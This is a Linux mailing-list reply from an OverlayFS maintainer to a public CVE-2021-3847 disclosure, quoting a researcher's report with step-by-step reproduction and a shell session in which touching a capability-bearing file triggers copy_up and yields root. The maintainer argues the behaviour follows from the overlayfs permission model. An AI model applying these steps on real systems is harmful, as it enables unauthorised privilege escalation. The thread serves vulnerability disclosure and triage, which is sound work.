Return-Path: <linux-unionfs-owner@kernel.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from mail.kernel.org (mail.kernel.org [198.145.29.99])
	by smtp.lore.kernel.org (Postfix) with ESMTP id BDFFAC433EF
	for <linux-unionfs@archiver.kernel.org>; Tue, 19 Oct 2021 15:26:16 +0000 (UTC)
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.kernel.org (Postfix) with ESMTP id A62C960F25
	for <linux-unionfs@archiver.kernel.org>; Tue, 19 Oct 2021 15:26:16 +0000 (UTC)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S230097AbhJSP22 (ORCPT
        <rfc822;linux-unionfs@archiver.kernel.org>);
        Tue, 19 Oct 2021 11:28:28 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49814 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S233970AbhJSP21 (ORCPT
        <rfc822;linux-unionfs@vger.kernel.org>);
        Tue, 19 Oct 2021 11:28:27 -0400
Received: from mail-ed1-x534.google.com (mail-ed1-x534.google.com [IPv6:2a00:1450:4864:20::534])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 94A1DC06161C
        for <linux-unionfs@vger.kernel.org>; Tue, 19 Oct 2021 08:26:14 -0700 (PDT)
Received: by mail-ed1-x534.google.com with SMTP id i20so14157446edj.10
        for <linux-unionfs@vger.kernel.org>; Tue, 19 Oct 2021 08:26:14 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=szeredi.hu; s=google;
        h=date:from:to:cc:subject:message-id:references:mime-version
         :content-disposition:content-transfer-encoding:in-reply-to;
        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
        b=kikRDXXO//5oWFd0HxBCxAHfmNAvweGQLARgqO1XAM76kgovdBlz+K+gfFWHjMjWWc
         4QuxtIjTL5JXfhF0Yl5IYLVwbZYFXWOQVbKCt+Yyunn3z8TABEdL6Il3UoGC4/sHGsRp
         v4xhswV/4+02U8WvBoq5KGhEtQkTaDzFCTnrc=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:date:from:to:cc:subject:message-id:references
         :mime-version:content-disposition:content-transfer-encoding
         :in-reply-to;
        bh=MZgniYHas0G8uMpaAIYxjaFr/MQdHHdVlrH0fW6i6VU=;
        b=Cad86hniiGt8MiBYdEDjV0acbKtTf3GLXzFUcqlkrFvn/lvZWfPAwSKcx4bjFdCO8S
         ezp5Ni5Nnci7H2rjQDsoUDeW2218ULMuJkjAiS0QtI/m/oE5DkoBAEv1O6O5TG9t8gUN
         xE9+88GwVTbEmb29S6ELq8m2U6CwDIaOMjU1q6/d2yO1KDhTVc8Xlf79bGTyXYHZNOoi
         IPgoPn7Z5FvullMbNT0yfwWwfpKAWbSQhXaNx99wP158YTI/y017yWNGgfXebJE+weIW
         UO0PkldBJagFliEAgvXli9D84WBMkuGZM8i5o75ZHmSMLx9nulLYvL8tw7N5QbNd82uc
         d2cQ==
X-Gm-Message-State: AOAM5302cVDgIdsf/T2RdREsPDopYuqYryma18PP32CsAHaeejFiSUj1
        gmaGpAFhbm9yE52YdkHTZeBzZw==
X-Google-Smtp-Source: ABdhPJxflk94TgsCYNCviF0dh0QHT8wwWTznQc8FeBreEiI/gHxpqdWHMP1PdH73T2CLuQBBoZrUmg==
X-Received: by 2002:a17:906:8397:: with SMTP id p23mr40129688ejx.43.1634657016553;
        Tue, 19 Oct 2021 08:23:36 -0700 (PDT)
Received: from miu.piliscsaba.redhat.com (catv-86-101-169-16.catv.broadband.hu. [86.101.169.16])
        by smtp.gmail.com with ESMTPSA id x13sm10394595ejv.64.2021.10.19.08.23.35
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 19 Oct 2021 08:23:35 -0700 (PDT)
Date:   Tue, 19 Oct 2021 17:23:27 +0200
From:   Miklos Szeredi <miklos@szeredi.hu>
To:     oss-security@lists.openwall.com
Cc:     linux-fsdevel@vger.kernel.org, linux-unionfs@vger.kernel.org,
        Alon Zahavi <Alon.Zahavi@cyberark.com>,
        Vegard Nossum <vegard.nossum@oracle.com>,
        Thadeu Lima de Souza Cascardo <cascardo@canonical.com>,
        Nir Chako <Nir.Chako@cyberark.com>,
        Alon Zahavi <zahavi.alon@gmail.com>
Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege
 Escalation using overlays copy_up
Message-ID: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
 <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Disposition: inline
Content-Transfer-Encoding: 8bit
In-Reply-To: <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
Precedence: bulk
List-ID: <linux-unionfs.vger.kernel.org>
X-Mailing-List: linux-unionfs@vger.kernel.org

On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
> 
> After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
> There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
> This vulnerability was attached with CVE-2021-3847.
> Here is the report that was initially sent:
> 
> ## Bug Class
> Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
> # Technical Details
> ## Summary:
> An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
> ## In details:
> If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.

I think this is a misunderstanding about how overlayfs operates.  Mounting
overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
In other words if the admin creates an overlay where the lower layer is
untrusted and the upper layer is trusted, then that act itself is the
privilege escalation.

This is more formally documented in "Documentation/filesystems/overlayfs.rst"
in the "Permission model" section.

If this model is not clear, then maybe it needs to be spelled out more
explicitly.  Perhaps even a warning message could be added to the kernel logs
in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
skipping copy up of certain attributes would make the cure worse than the
disease.

Let me know if I'm missing something.

Thanks,
Miklos

> See attached image.
> ## Build:
> Any Linux machine with a support for overlayFS.
> For example: AWS EC2 Ubuntu 20.04.
> Mount a device to any folder.
> Copy any file with capabilities into that folder.
> Remount the device now with nosuid option.
> mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
> ## Execution:
> As a low-priv user cd into the merged directory.
> Execute touch capable_file
> cd to the upper layer directory.
> Execute the capable binary.
> ## Expected Results:
> When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
> ## Observed Results:
> The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
> 
> 
> ########## Example ##########
> # there are two mount in question
> $ cd /home/user/overlayfs/
> 
> $ ls -l
> drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
> drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
> drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
> drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
> drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
> 
> # there are two mount in question.
> # lowerUSB is a mount of an USB, which has a capable file inside.
> # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
> # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
> $ mount
> /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
> overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
> 
> # The contents of all the directories.
> $ ls -l *
> lowerUSB:
> total 40
> -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
> 
> merge:
> total 40
> -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
> drwx------ 2 user user 16384 Jul  5 14:07 lost+found
> 
> test:
> total 0
> 
> upper:
> total 0
> 
> work:
> total 4
> d--------- 2 root root 4096 Sep 19 14:25 work
> 
> # escalate is an executable that set its uid and gid to 0.
> $ getcap ./lowerUSB/escalate
> ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
> 
> $ id
> uid=1000(user) gid=1000(user) groups=1000(user)
> 
> # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
> $ ./lowerUSB/escalate
> [-] Failure
> 
> # Try to copy the binary with its capabilities.
> # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
> $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
> cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
> 
> # Trigger the copy_up
> $ touch ./merge/escalate
> $ ls -l ./upper/
> -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
> 
> # The copy_up kept the binary capabilities (xattr)
> $ getcap ./upper/escalate
> ./upper/escalate = cap_setgid,cap_setuid+eip
> 
> # executing the binary, with the capabilities, so the privileges will escalate to root.
> $ ./upper/escalate
> $ id
> uid=0(root) gid=0(root) groups=0(root)
> 
> 
